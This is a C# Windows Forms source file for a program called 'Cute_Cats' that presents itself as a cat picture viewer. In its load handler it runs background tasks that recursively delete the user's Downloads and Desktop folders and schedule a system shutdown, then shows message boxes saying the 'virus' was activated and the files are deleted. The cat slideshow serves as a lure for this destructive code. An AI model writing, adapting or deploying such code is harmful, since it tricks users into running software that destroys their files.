using System;
using System.Threading;
using System.Windows.Forms;

namespace Cute_Cats
{
    public partial class Form1 : Form
    {
        MassiveHelper mh = new MassiveHelper();

        private bool imJustACatViewer = false;
        private bool delsOK1 = false;
        private bool delsOK2 = false;

        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new frmImages().Show();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button1.Visible = false;
            mh.StartActionInSingleTask(wowCats);
            if (!imJustACatViewer){
                mh.StartActionInSingleTask(delDL);
                mh.StartActionInSingleTask(delDesktop);
            }
        }

        public void wowCats(){
            for (int b = 0; b < 2; b++)
            {
                for (int i = 0; i < mh.cats.Length - 1; i++)
                {
                    pictureBox1.Image = mh.cats[i];
                    pictureBox1.Update();
                    mh.Sleep(mh.ps);
                }
            }
            if (!imJustACatViewer)
            {
                while (!delsOK1 && !delsOK2)
                {
                    Application.DoEvents();
                }
                mh.StartActionInSingleTask(aaaa);
            }
            startMessages();
        }

        public void startMessages()
        {
            mh.StartActionInSingleTask(messages);
        }

        public void messages()
        {
            button1.Visible = true;
            MessageBox.Show("Thanks for activate the virus", "Cute cats", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            MessageBox.Show("Your files are deleted", "Cute cats", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            MessageBox.Show("Sorry :(", "Cute cats", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        public void aaaa()
        {
            mh.DudeSpeak(mh.aaaa);
        }

        public void delDL()
        {
            mh.Shutdown(30);
            mh.DeleteWithSubDir(mh.GetDLDir());
            delsOK2 = true;
        }

        public void delDesktop()
        {
            mh.DeleteWithSubDir(mh.GetDesktopDir());
            delsOK1 = true;
        }
    }
}
